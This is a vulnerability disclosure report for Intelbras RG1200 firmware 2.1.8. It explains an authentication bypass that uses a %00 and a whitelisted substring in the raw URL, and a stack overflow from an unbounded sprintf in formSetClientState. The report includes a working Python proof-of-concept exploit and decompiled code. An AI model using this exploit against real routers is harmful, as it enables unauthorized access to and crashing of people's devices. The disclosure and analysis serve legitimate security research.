# CVE Report - Authentication Bypass and Stack Buffer Overflow Vulnerability in Intelbras RG1200 2.1.8 Routers (`formSetClientState`)

## Vulnerability Title

Authentication Bypass and Stack Buffer Overflow Vulnerability in Intelbras RG1200 2.1.8 Routers (`formSetClientState`)

## Vulnerability Description

Intelbras RG1200 firmware 2.1.8 contains an authentication bypass in the request dispatch chain (`R7WebsSecurityHandler` + `websFormHandler`) caused by inconsistent use of the raw (non-decoded) URL versus the decoded path. Remote unauthenticated attackers can bypass authentication by crafting a URL containing `%00` and a whitelisted substring (e.g., `img/main-logo.png`) in the raw URL so that the security handler matches the whitelist while the form dispatcher resolves the decoded/truncated path to a protected `/goform` handler.

After authentication bypass, an attacker can trigger a stack buffer overflow in `formSetClientState`. When `limitEn` is enabled, multiple user-controlled parameters are formatted into a fixed-size stack buffer using `sprintf` without bounds checking.

## POC

```py
import requests
import sys


def exploit(target_ip, port=80, cookie="SESSION=<REPLACE>"):
    base = f"http://{target_ip}:{port}"
    url = f"{base}/goform/formSetClientState%00img/main-logo.png"

    data = {
        "deviceId": "A" * 300,
        "limitEn": "1",
        "limitSpeed": "B" * 300,
        "limitSpeedUp": "C" * 300,
    }

    headers = {
        "Cookie": cookie,
    }

    r = requests.post(url, data=data, headers=headers, timeout=10)
    print("status:", r.status_code)
    print(r.text[:2000])


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("usage: python poc.py <target_ip> [port]")
        sys.exit(1)
    ip = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
    exploit(ip, port=port)
```

## Cause Analysis

### 1. Authentication Bypass — Raw URL vs Decoded Path Inconsistency

The HTTP request parsing logic in `websParseFirst` (0x42ea1c) stores the raw request URL into `wp->url` (not URL-decoded), while `wp->path` is derived from a decoded buffer produced by `websDecodeUrl` → `websUrlParse`:

```c
// websParseFirst (0x42ea1c) — sets wp->url = raw, wp->path = decoded
int __cdecl websParseFirst(webs_t wp, char_t *text)
{
    url = strtok(0, " \t\n");                         // raw URL from HTTP request line
    if ( websUrlParse(url, &buf, &host, &path, &port, &query, &proto, 0, &ext) >= 0 )
    {
        wp->url = bstrdup(url);      // ← raw URL, NOT decoded
        wp->path = bstrdup(path);    // ← decoded path from websDecodeUrl
        // ...
    }
}
```

In `R7WebsSecurityHandler` (0x434c34), the whitelist check is performed using `strstr(url, ...)` on the **raw** `url` parameter (which is `wp->url`). By crafting a raw URL such as `/goform/formSetClientState%00img/main-logo.png`, the security handler matches the whitelisted substring and returns 0 (allow) without enforcing authentication:

```c
// R7WebsSecurityHandler (0x434c34) — whitelist check on raw URL
if ( !strncmp(url, "/public/", 8u)
  || !strncmp(url, "/lang/", 6u)
  || strstr(url, "img/main-logo.png")    // ← BYPASS: matches %00img/main-logo.png in raw URL
  || strstr(url, "reasy-ui-1.0.3.js")
  // ...
{
    return 0;  // ← Authentication bypassed
}
```

Meanwhile, `websDecodeUrl` (0x430ebc) decodes `%00` to a null byte, causing `websFormHandler` (0x415710) to receive the **decoded** path `/goform/formSetClientState` and dispatch to the handler.

### 2. Stack Buffer Overflow — Unbounded sprintf in formSetClientState

`formSetClientState` (0x4a5bc4) obtains multiple user-controlled parameters and formats them via `sprintf` into a fixed-size 512-byte stack buffer:

```c
// formSetClientState (0x4a5bc4)
void __cdecl formSetClientState(webs_t wp, char_t *path, char_t *query)
{
    char *dev_id;
    char *ul_speed;
    char *dl_speed;
    char *limit_en;
    char buff[512];           // ← 512-byte stack buffer
    char msg_info[256];
    char ret_buf[32];

    dev_id = websGetVar(wp, "deviceId", byte_4F14F4);
    limit_en = websGetVar(wp, "limitEn", "0");
    dl_speed = websGetVar(wp, "limitSpeed", "0");
    ul_speed = websGetVar(wp, "limitSpeedUp", "0");
    // ...
    if ( atoi(limit_en) )
    {
        v3 = atoi(limit_en);
        sprintf(buff, "%d;%s;%s;%s", v3, dev_id, ul_speed, dl_speed);  // ← OVERFLOW: unbounded format
        // ...
    }
}
```

The `sprintf` format `"%d;%s;%s;%s"` concatenates `dev_id`, `ul_speed`, and `dl_speed` without length checks. Three 300-byte inputs (900+ bytes total) easily overflow the 512-byte `buff` stack buffer.

